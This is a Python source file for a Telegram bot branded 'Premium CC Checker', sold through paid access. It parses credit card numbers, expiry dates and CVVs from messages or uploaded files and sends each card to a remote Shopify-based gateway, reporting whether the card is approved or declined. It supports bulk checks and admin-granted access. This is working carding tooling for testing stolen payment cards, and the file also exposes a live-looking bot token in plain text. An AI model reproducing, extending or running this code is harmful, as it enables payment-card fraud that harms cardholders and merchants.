import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          ReplyKeyboardMarkup, KeyboardButton)

# Configuration
BOT_TOKEN = "8374941881:AAGI8cU4W85SEN0WbEvg_eTZiGZdvXAmVCk"
MAIN_ADMIN_ID = 5103348494
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify-o00b.onrender.com"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def health_check():
    return "💳 Premium CC Checker is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class PremiumCcChecker:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
        self.START_MESSAGE = """
╔══💳 *PREMIUM CC CHECKER* 💳══╗
║                              ║
  🔥 *Commands* 🔥  
══════════════════════
🔹 */chk* - Instant Single Card Check
➖ Format: `/chk 4111111111111111|12|2025|123`
➖ Checks cards in 0.5s lightning speed!
📁 */mchk* - Bulk Mass Checker 
➖ Max 10 cards per batch
➖ Supports .txt files with auto-formatting
👑 */auth* - Authorize Users/Groups
➖ Format: `/auth user_id` or `/auth group group_id` (admin only)
══════════════════════
💎 *VIP Access:* 
Contact @mhitzxg for 
⚡ *Elite Membership* ⚡
📊 *Current Status:*
✅ Operational | 🚀 Turbo Mode Enabled
"""
        self.PROCESSING_ANIMATION = [
            "🔍 Analyzing Card Patterns...",
            "🔎 Verifying with Payment Gateways...",
            "🌐 Routing Through Global Nodes...",
            "⚡ Finalizing Transaction Check..."
        ]

    def load_data(self):
        """Load authorized users and admin data"""
        try:
            with open("authorized.json", "r") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    self.AUTHORIZED_ENTITIES = data
                else:
                    self.AUTHORIZED_ENTITIES = {
                        "users": {str(k): v for k, v in enumerate(data)},
                        "groups": {}
                    }
        except (FileNotFoundError, json.JSONDecodeError):
            self.AUTHORIZED_ENTITIES = {
                "users": {},
                "groups": {}
            }
            
        try:
            with open("admins.json", "r") as f:
                self.ADMIN_IDS = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.ADMIN_IDS = [MAIN_ADMIN_ID]

    def save_data(self):
        """Save current data to files"""
        with open("authorized.json", "w") as f:
            json.dump(self.AUTHORIZED_ENTITIES, f, indent=4)
        with open("admins.json", "w") as f:
            json.dump(self.ADMIN_IDS, f, indent=4)

    def normalize_card(self, text):
        """
        Improved card extraction that properly handles MM/YY format
        """
        if not text:
            return None
            
        # Standardize separators
        text = re.sub(r'[^\d|/\s]', ' ', text)
        
        # Match CC number (13-19 digits)
        cc_match = re.search(r'(?:\D|^)(\d{13,19})(?:\D|$)', text)
        if not cc_match:
            return None
            
        cc = cc_match.group(1).replace(' ', '')
        
        # Match expiration (mm/yy or mm/yyyy)
        exp_match = re.search(r'(\d{1,2})[ /](\d{2,4})', text)
        if not exp_match:
            return None
            
        mm = exp_match.group(1).zfill(2)
        yy = exp_match.group(2)
        
        # Handle 2-digit year (properly)
        if len(yy) == 2:
            current_year_short = time.strftime('%y')
            current_century = time.strftime('%Y')[:2]
            if int(yy) >= int(current_year_short):
                yy = current_century + yy  # 2024 if current year is 2023 and yy is 24
            else:
                yy = str(int(current_century)+1) + yy  # 2024 if current year is 2023 and yy is 24
        
        # Match CVV (3-4 digits)
        cvv_match = re.search(r'(?:\D|^)(\d{3,4})(?:\D|$)', text[exp_match.end():])
        if not cvv_match:
            cvv_match = re.search(r'(?:cvv|security.?code)\D*(\d{3,4})', text, re.I)
            if not cvv_match:
                return None
                
        cvv = cvv_match.group(1)
        
        return f"{cc}|{mm}|{yy}|{cvv}"

    def extract_cards_from_text(self, text):
        """Extract all valid cards from text with improved patterns"""
        cards = []
        lines = text.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Try to normalize the whole line first
            norm_card = self.normalize_card(line)
            if norm_card:
                cards.append(norm_card)
                if len(cards) >= MAX_CARDS_PER_MCHK:
                    break
                continue
                
            # If normalization fails, try more aggressive pattern matching
            patterns = [
                # Standard format: 4111111111111111|12|2025|123
                r'(?:\b|^)(\d{13,19})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
                # Format with separators: 4111 1111 1111 1111 12/25 123
                r'(?:\b|^)(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
                # Format with labels: CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033
                r'(?:cc|card|number)\D*(\d{13,19})\D*(?:exp|date)\D*(\d{1,2})\D*(\d{2,4})\D*(?:cvv|security)\D*(\d{3,4})',
                # Format with MM/YY: 5597670076299187 04/27 747
                r'(?:\b|^)(\d{13,19})\b.*?(\d{1,2})[/ ](\d{2})(?:\D|$).*?(\d{3,4})\b'
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    cc = match.group(1).replace(' ', '')
                    mm = match.group(2).zfill(2)
                    yy = match.group(3)
                    cvv = match.group(4)
                    
                    # Special handling for MM/YY format (2-digit year)
                    if len(yy) == 2 and pattern == patterns[-1]:
                        current_year_short = time.strftime('%y')
                        current_century = time.strftime('%Y')[:2]
                        if int(yy) >= int(current_year_short):
                            yy = current_century + yy
                        else:
                            yy = str(int(current_century)+1) + yy
                    
                    card = f"{cc}|{mm}|{yy}|{cvv}"
                    if card not in cards:
                        cards.append(card)
                        if len(cards) >= MAX_CARDS_PER_MCHK:
                            break
                
                if len(cards) >= MAX_CARDS_PER_MCHK:
                    break
                    
        return cards[:MAX_CARDS_PER_MCHK]

    def generate_user_agent(self):
        """Generate random user agent"""
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ])

    def clean_raw_response(self, text):
        """Clean the raw response by removing unwanted characters"""
        # Remove <pre> tags if present
        text = text.replace('<pre>', '').replace('</pre>', '')
        # Remove backslashes that escape special characters
        text = text.replace('\\', '')
        # Remove forward slashes that might break Markdown
        text = text.replace('/', '／')  # Replace with fullwidth slash
        return text.strip()

    def check_card(self, cc_line):
        """Check card via gateway and return cleaned raw response"""
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            return self.clean_raw_response(response.text)
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    def is_admin(self, user_id):
        return user_id in self.ADMIN_IDS
        
    def is_authorized(self, user_id, chat_id=None):
        if self.is_admin(user_id):
            return True
        
        if str(user_id) in self.AUTHORIZED_ENTITIES.get("users", {}):
            expiry = self.AUTHORIZED_ENTITIES["users"][str(user_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_ENTITIES["users"][str(user_id)]
                self.save_data()
        
        if chat_id and str(chat_id) in self.AUTHORIZED_ENTITIES.get("groups", {}):
            expiry = self.AUTHORIZED_ENTITIES["groups"][str(chat_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_ENTITIES["groups"][str(chat_id)]
                self.save_data()
                
        return False

    def send_unauthorized_message(self, msg):
        self.bot.reply_to(
            msg,
            "🔒 *Access Denied* 🔒\n\n"
            "This is a premium service requiring authorization.\n\n"
            "Contact @mhitzxg for access\n"
            "🆔 Your ID: `{}`".format(msg.from_user.id),
            parse_mode='Markdown'
        )

    def start_mass_check(self, chat_id, cc_lines):
        """Process multiple cards with single updating message"""
        total = len(cc_lines)
        approved = declined = 0
        processing_delay = 1.2
        results = []
        
        status_msg = self.bot.send_message(
            chat_id,
            f"""
╔═══════════════════════╗
  📊 *MASS CHECK INITIATED* 📊  
╚═══════════════════════╝
⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `0`
❌ *Declined:* `0`
🔄 *Processing:* `0/{total}`
═══════════════════════
🛡️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
            """,
            parse_mode='Markdown'
        )

        def process_cards():
            nonlocal approved, declined
            
            for index, cc in enumerate(cc_lines, 1):
                try:
                    time.sleep(processing_delay)
                    cc_parts = cc.split('|')
                    raw_result = self.check_card(cc)
                    
                    if any(x in raw_result.lower() for x in ["charged", "cvv match", "approved", "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂"]):
                        approved += 1
                        status = "✅ APPROVED ✅"
                    else:
                        declined += 1
                        status = "❌ DECLINED ❌"
                    
                    # Format the result with cleaned raw response
                    results.append(f"""
💳 *Card {index}:* `{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}`
📊 *Status:* {status}
📝 *Response:*
{raw_result}
------------------------------------
""")
                    
                    try:
                        self.bot.edit_message_text(
                            f"""
╔═══════════════════════╗
  📊 *MASS CHECK IN PROGRESS* 📊  
╚═══════════════════════╝
⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `{approved}`
❌ *Declined:* `{declined}`
🔄 *Processing:* `{index}/{total}`
═══════════════════════
🛡️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
                            """,
                            chat_id,
                            status_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Error updating status: {e}")
                    
                except Exception as e:
                    logger.error(f"Error processing card {index}: {e}")
                    results.append(f"""
💳 *Card {index}:* `{cc}`
❌ *Error Processing Card*
⚠️ *Error:* `{str(e)}`
------------------------------------
""")
                    continue
            
            success_rate = (approved/total)*100 if total > 0 else 0
            
            # Prepare final message with all results
            stats_part = f"""
╔═══════════════════════╗
  🎉 *MASS CHECK COMPLETE* 🎉  
╚═══════════════════════╝
📈 *Final Statistics:*
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `{approved}` ({success_rate:.2f}%)
❌ *Declined:* `{declined}`
⏱️ *Total Time:* `{total * processing_delay:.2f}s`
═══════════════════════
⚡ *System Shutdown:* `NORMAL`
🕒 *Completed at:* {time.strftime('%H:%M:%S')}
💎 *Thank you for using Premium CC Checker*
═══════════════════════
🔍 *Detailed Results:*
"""
            
            results_part = ''.join(results)
            final_message = stats_part + results_part
            
            try:
                # Send as plain text if too long for Markdown
                if len(final_message) <= 4096:
                    try:
                        self.bot.edit_message_text(
                            final_message,
                            chat_id,
                            status_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except:
                        # Fallback to plain text if Markdown fails
                        self.bot.edit_message_text(
                            final_message,
                            chat_id,
                            status_msg.message_id,
                            parse_mode=None
                        )
                else:
                    # If too long, send stats first then results as reply
                    self.bot.edit_message_text(
                        stats_part,
                        chat_id,
                        status_msg.message_id,
                        parse_mode='Markdown'
                    )
                    # Send results in chunks as plain text
                    chunk_size = 4000
                    for i in range(0, len(results_part), chunk_size):
                        self.bot.send_message(
                            chat_id,
                            results_part[i:i+chunk_size],
                            parse_mode=None
                        )
            except Exception as e:
                logger.error(f"Error sending final message: {e}")
                self.bot.send_message(
                    chat_id,
                    "🎉 *MASS CHECK COMPLETE*\n" + stats_part,
                    parse_mode='Markdown'
                )

        threading.Thread(target=process_cards).start()

    def register_handlers(self):
        """Register all bot command handlers"""
        @self.bot.message_handler(commands=['start', 'help'])
        def start_handler(msg):
            markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            markup.add(
                KeyboardButton('/chk'),
                KeyboardButton('/mchk'),
                KeyboardButton('/auth'),
                KeyboardButton('📞 Contact Admin'),
                KeyboardButton('📊 Bot Status')
            )
            self.bot.send_message(
                msg.chat.id,
                self.START_MESSAGE,
                parse_mode='Markdown',
                reply_markup=markup,
                disable_web_page_preview=True
            )

        @self.bot.message_handler(commands=['chk'])
        def chk_handler(msg):
            chat_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else None
            if not self.is_authorized(msg.from_user.id, chat_id):
                return self.send_unauthorized_message(msg)

            cc = None
            if msg.reply_to_message:
                cc = self.normalize_card(msg.reply_to_message.text)
            else:
                args = msg.text.split(None, 1)
                if len(args) > 1:
                    cc = self.normalize_card(args[1]) or args[1]

            if not cc:
                return self.bot.reply_to(
                    msg,
                    "❌ *Invalid Format!*\n\n"
                    "ℹ️ Please use:\n"
                    "`/chk 4111111111111111|12|2025|123`\n\n"
                    "🔍 Or reply to a message containing CC details\n"
                    "Supported formats:\n"
                    "- 4663490004132950|09|26|397|...\n"
                    "- CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033\n"
                    "- 4111 1111 1111 1111 12/25 123\n"
                    "- 5597670076299187 04/27 747",
                    parse_mode='Markdown'
                )

            processing_msg = self.bot.reply_to(
                msg,
                "⚙️ *Initializing Premium Check System...*\n"
                "⚡ Lightning Verification Protocol Activated",
                parse_mode='Markdown'
            )
            
            stop_event = threading.Event()
            def loading_animation():
                for frame in self.PROCESSING_ANIMATION:
                    if stop_event.is_set():
                        return
                    try:
                        self.bot.edit_message_text(
                            frame,
                            msg.chat.id,
                            processing_msg.message_id,
                            parse_mode='Markdown'
                        )
                        time.sleep(1.5)
                    except:
                        break

            threading.Thread(target=loading_animation).start()

            try:
                raw_result = self.check_card(cc)
                stop_event.set()
                
                cc_parts = cc.split('|')
                
                response_text = f"""
╔═══════════════════════╗
  💳 Card Check Complete 💳  
╚═══════════════════════╝
🔹 Card: {cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}
📝 Response:
{raw_result}

🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}
⚡ Powered by Premium CC Checker
"""
                try:
                    self.bot.edit_message_text(
                        response_text,
                        msg.chat.id,
                        processing_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    # Fallback to plain text if Markdown fails
                    self.bot.edit_message_text(
                        response_text,
                        msg.chat.id,
                        processing_msg.message_id,
                        parse_mode=None
                    )
                
            except Exception as e:
                stop_event.set()
                error_msg = f"❌ System Error ❌\n\nError: {str(e)}\n\n🛠️ Please try again or contact support"
                self.bot.edit_message_text(
                    error_msg,
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode=None
                )

        @self.bot.message_handler(commands=['mchk'])
        def mchk_handler(msg):
            chat_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else None
            if not self.is_authorized(msg.from_user.id, chat_id):
                return self.send_unauthorized_message(msg)

            response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

            if not msg.reply_to_message:
                return self.bot.send_message(response_chat, "❌ Reply to a message with CCs or a file.")

            text = ""
            if msg.reply_to_message.document:
                try:
                    file_info = self.bot.get_file(msg.reply_to_message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    text = downloaded_file.decode("utf-8", errors="ignore")
                except Exception as e:
                    return self.bot.send_message(response_chat, f"❌ File error: {str(e)}")
            else:
                text = msg.reply_to_message.text or ""

            cc_lines = self.extract_cards_from_text(text)
            
            if not cc_lines:
                return self.bot.send_message(response_chat, "❌ No valid cards found.")

            if len(cc_lines) > MAX_CARDS_PER_MCHK:
                self.bot.send_message(response_chat, f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")
                cc_lines = cc_lines[:MAX_CARDS_PER_MCHK]

            self.start_mass_check(response_chat, cc_lines)

        @self.bot.message_handler(commands=['auth'])
        def auth_handler(msg):
            if not self.is_admin(msg.from_user.id):
                return self.bot.reply_to(msg, "❌ Admin access required!")
            
            args = msg.text.split()
            if len(args) < 2:
                return self.bot.reply_to(msg, "Usage: /auth user_id OR /auth group group_id")
            
            if len(args) >= 3 and args[1].lower() == "group":
                try:
                    group_id = int(args[2])
                    if group_id > 0:
                        group_id = -group_id
                    
                    if "groups" not in self.AUTHORIZED_ENTITIES:
                        self.AUTHORIZED_ENTITIES["groups"] = {}
                    
                    self.AUTHORIZED_ENTITIES["groups"][str(group_id)] = "forever"
                    self.save_data()
                    
                    return self.bot.reply_to(
                        msg,
                        f"✅ Successfully authorized group {group_id}\n"
                        f"Access granted: Permanent\n"
                        f"Current authorized groups: {len(self.AUTHORIZED_ENTITIES.get('groups', {}))}",
                        parse_mode='Markdown'
                    )
                except ValueError:
                    return self.bot.reply_to(msg, "❌ Invalid group ID format! Must be a number.")
            
            try:
                user_id = int(args[1])
                if "users" not in self.AUTHORIZED_ENTITIES:
                    self.AUTHORIZED_ENTITIES["users"] = {}
                
                self.AUTHORIZED_ENTITIES["users"][str(user_id)] = "forever"
                self.save_data()
                
                self.bot.reply_to(
                    msg,
                    f"✅ Successfully authorized user {user_id}\n"
                    f"Access granted: Permanent\n"
                    f"Current authorized users: {len(self.AUTHORIZED_ENTITIES.get('users', {}))}",
                    parse_mode='Markdown'
                )
            except ValueError:
                return self.bot.reply_to(msg, "❌ Invalid user ID format! Must be a number.")

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    bot = PremiumCcChecker()
    logger.info("🚀 Starting Premium CC Checker Bot")
    bot.bot.polling(none_stop=True)

if __name__ == '__main__':
    main()




